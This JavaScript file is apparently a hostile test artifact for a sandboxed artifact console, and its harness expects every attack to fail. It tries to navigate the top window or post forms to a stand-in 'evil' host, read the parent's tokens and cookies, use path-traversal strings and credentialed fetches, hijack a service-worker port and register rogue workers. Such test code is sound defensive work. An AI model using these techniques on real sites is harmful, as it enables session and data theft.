// A hostile artifact (artifacts.md §5.5): each attack reports what it got; run.mjs asserts every one failed.
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const show = (v) => (v === undefined ? 'undefined' : v === null ? 'null' : String(v).slice(0, 120))
const tryIt = async (fn) => {
  try {
    return 'got ' + show(await fn())
  } catch (e) {
    return 'threw ' + (e?.name || e)
  }
}
const read = async (url, init) => {
  const r = await fetch(url, init)
  return `${r.status} ${r.type} ${await r.text().catch(() => '')}`
}
const decode = (body) => (body ? new TextDecoder().decode(body).slice(0, 80) : null)

let cfg
const ready = fetch('/hostile/config.json')
  .then((r) => r.json())
  .then((c) => {
    cfg = c
    document.getElementById('top-link').href = `${cfg.evil}/top-link`
    document.getElementById('blank-link').href = `${cfg.evil}/blank-link`
    document.getElementById('form').action = `${cfg.evil}/form-self`
    document.getElementById('form-top').action = `${cfg.evil}/form-top`
    document.getElementById('popup-btn').onclick = async () =>
      (window.__popup = await tryIt(() => window.open(`${cfg.evil}/popup-click`)))
  })

// The shim shares this origin, so its realm is ours: patch its worker's postMessage and make it ask the console for a port.
async function stealPort() {
  const shim = parent
  const proto = shim.ServiceWorker.prototype
  const original = proto.postMessage
  let stolen = null
  proto.postMessage = function (message, transfer) {
    if (!stolen && transfer?.[0]) return void (stolen = transfer[0])
    return original.call(this, message, transfer)
  }
  shim.navigator.serviceWorker.dispatchEvent(new shim.MessageEvent('message', { data: { t: 'need-port' } }))
  for (let i = 0; i < 30 && !stolen; i++) await sleep(100)
  proto.postMessage = original
  return stolen
}

const attacks = {
  async navigateTop() {
    return {
      'top.location.href': await tryIt(() => (top.location.href = `${cfg.evil}/top-href`)),
      'top.location.replace': await tryIt(() => top.location.replace(`${cfg.evil}/top-replace`)),
      'open(_top)': await tryIt(() => window.open(`${cfg.evil}/top-open`, '_top')),
      'parent.location': await tryIt(() => (parent.location.href = `${cfg.evil}/parent`)),
      'click a[target=_top]': await tryIt(() => document.getElementById('top-link').click())
    }
  },

  async popups() {
    return {
      'window.open': await tryIt(() => window.open(`${cfg.evil}/popup-open`)),
      'click a[target=_blank]': await tryIt(() => document.getElementById('blank-link').click())
    }
  },

  async forms() {
    return {
      'form.submit()': await tryIt(() => document.getElementById('form').submit()),
      'form.requestSubmit()': await tryIt(() => document.getElementById('form').requestSubmit()),
      'form[target=_top].submit()': await tryIt(() => document.getElementById('form-top').submit())
    }
  },

  async readConsole() {
    return {
      'top.document': await tryIt(() => top.document.title),
      'top.localStorage': await tryIt(() => top.localStorage.getItem('ac-token')),
      'top.__acLog': await tryIt(() => JSON.stringify(top.__acLog)),
      'top.document.cookie': await tryIt(() => top.document.cookie),
      'own localStorage': await tryIt(() => localStorage.getItem('ac-token')),
      'own cookie': await tryIt(() => document.cookie)
    }
  },

  async credentialed() {
    return {
      'console include': await tryIt(() => read(`${cfg.console}/secret`, { credentials: 'include' })),
      'console no-cors': await tryIt(() => read(`${cfg.console}/secret`, { mode: 'no-cors', credentials: 'include' })),
      'cp include': await tryIt(() => read(`${cfg.cp}/api/v1/me`, { credentials: 'include' })),
      'cp omit': await tryIt(() => read(`${cfg.cp}/api/v1/me`))
    }
  },

  // Frames another revision's origin (and, in --web mode, web's own console) and tries to read into them.
  async frames() {
    const targets = { other: `${cfg.other}/index.html`, otherFile: `${cfg.other}/b-secret.html` }
    targets.otherShim = `${cfg.other}/__ac/shim`
    // `/-/home` directly: with the content domain `localhost`, web's `/home` rewrite would land on a content host.
    if (cfg.web) targets.webConsole = `${cfg.web}/-/home`
    for (const [id, src] of Object.entries(targets)) {
      const f = document.createElement('iframe')
      f.id = f.name = id
      f.src = src
      document.body.append(f)
    }
    await sleep(2500)
    const out = {}
    for (const id of Object.keys(targets)) {
      const w = document.getElementById(id).contentWindow
      out[`${id} document`] = await tryIt(() => w.document.body.innerText)
      out[`${id} localStorage`] = await tryIt(() => w.localStorage.getItem('b-secret'))
    }
    out['own localStorage b-secret'] = await tryIt(() => localStorage.getItem('b-secret'))
    out['fetch other origin'] = await tryIt(() => read(`${cfg.other}/b-secret.html`))
    return out
  },

  // Posted straight to the console, these carry this frame as their source, not the shim.
  async spoof() {
    const channel = new MessageChannel()
    top.postMessage({ t: 'ready' }, '*')
    top.postMessage({ t: 'need-port' }, '*')
    top.postMessage({ t: 'path', path: '/spoofed' }, '*')
    top.postMessage({ t: 'port', entry: '/spoofed' }, '*', [channel.port2])
    await sleep(500)
    return { posted: 4 }
  },

  async outsideManifest() {
    const out = {}
    const paths = [
      '/b-secret.html',
      '/../b-secret.html',
      '/%2e%2e/b-secret.html',
      '/..%2fb-secret.html',
      '/hostile/..%2f..%2fb-secret.html',
      '//b-secret.html',
      '/hostile/../../b-secret.html'
    ]
    for (const p of paths) out[`fetch ${p}`] = await tryIt(() => read(location.origin + p))
    const port = await stealPort()
    out.stolen = port ? 'yes' : 'no'
    if (!port) return out
    const waiting = new Map()
    let id = 1e6
    port.onmessage = (e) => !e.data?.ack && waiting.get(e.data?.id)?.(e.data)
    const ask = (request) =>
      new Promise((resolve) => {
        const n = ++id
        waiting.set(n, (d) => resolve(`${d.status} ${decode(d.body)}`))
        port.postMessage({ id: n, navigate: false, range: null, ...request })
        setTimeout(() => resolve('no answer'), 3000)
      })
    out['port /index.html (control)'] = await ask({ path: '/index.html' })
    for (const p of ['/b-secret.html', 'b-secret.html', '../b-secret.html', '/hostile/../../b-secret.html'])
      out[`port ${p}`] = await ask({ path: p })
    out['port other origin url'] = await ask({ path: `${cfg.other}/b-secret.html` })
    out['port revision 2'] = await ask({ path: '/b-secret.html', revision: 2, label: new URL(cfg.other).hostname })
    out['port /__ac/sw.js'] = await ask({ path: '/__ac/sw.js' })
    out['port navigate /b-secret.html'] = await ask({ path: '/b-secret.html', navigate: true })
    out['port Range on another file'] = await ask({ path: '/b-secret.html', range: 'bytes=0-' })
    return out
  },

  // A worker script is fetched past every worker, so only the network could serve one, and it answers 404.
  async registerWorker() {
    const sw = navigator.serviceWorker
    const blob = URL.createObjectURL(new Blob(['self.onfetch = () => {}'], { type: 'text/javascript' }))
    const out = {
      'own script, scope /': await tryIt(() => sw.register('/hostile/evil-sw.js', { scope: '/' })),
      'own script, scope /hostile/': await tryIt(() => sw.register('/hostile/evil-sw.js', { scope: '/hostile/' })),
      'blob: script': await tryIt(() => sw.register(blob, { scope: '/' })),
      'data: script': await tryIt(() => sw.register('data:text/javascript,self.onfetch=()=>{}', { scope: '/' })),
      'other revision script': await tryIt(() => sw.register(`${cfg.other}/__ac/sw.js`, { scope: '/' })),
      'scope above /': await tryIt(() => sw.register('/__ac/sw.js', { scope: `${cfg.other}/` }))
    }
    const regs = await sw.getRegistrations()
    out.registrations = regs.map((r) => `${(r.active || r.waiting || r.installing)?.scriptURL} ${r.scope}`).join(', ')
    return out
  },

  async flood() {
    // WebKit itself throws after 100 history calls in 10 seconds.
    let pushState = 0
    try {
      for (; pushState < 1000; pushState++) history.pushState(null, '', `/flood/${pushState}`)
    } catch (e) {
      pushState = `${pushState}, then threw ${e.name}`
    }
    for (let i = 0; i < 100; i++)
      parent.navigator.serviceWorker.dispatchEvent(new parent.MessageEvent('message', { data: { t: 'need-port' } }))
    await sleep(1500)
    return { pushState, needPort: 100 }
  }
}

window.attack = attacks
ready.then(() => (attacks.ready = true))
